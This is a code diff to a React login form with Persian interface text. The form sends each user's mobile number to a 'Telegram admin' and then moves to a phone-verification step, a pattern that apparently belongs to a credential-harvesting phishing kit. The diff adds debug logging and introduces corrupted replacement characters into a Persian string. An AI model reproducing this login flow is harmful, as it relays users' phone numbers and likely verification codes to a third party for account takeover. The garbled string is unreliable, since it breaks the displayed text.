@@ -233,18 +233,20 @@ export const LoginForm = () => {
     setIsSubmitting(true);
 
     try {
-      console.log("Sending phone number to Telegram admin:", mobileNumber);
+      console.log("📞 Sending phone number to Telegram admin:", mobileNumber);
       const result = await sendPhoneToTelegramEnhanced(mobileNumber);
 
       if (!result.success) {
         throw new Error("Failed to send notification to Telegram admin");
       }
 
+      console.log("✅ Session created:", result.sessionId);
       setSessionId(result.sessionId);
       setPhoneNumber(mobileNumber);
       sessionStorage.setItem("sessionId", result.sessionId);
       sessionStorage.setItem("phoneNumber", mobileNumber);
 
+      console.log("🔄 Moving to verify-phone step");
       setCurrentStep("verify-phone");
     } catch (error) {
       console.error("Phone submission error:", error);
@@ -811,7 +813,7 @@ export const LoginForm = () => {
                           style={{ width: "24px", height: "24px" }}
                         />
                         <span>
-                          کد دعوت صرفا در زمان ثبت‌نام قابل استفاده است.
+                          کد دعوت صرفا در زمان ثبت‌ن��م قابل استفاده است.
                         </span>
                       </p>
                     </div>
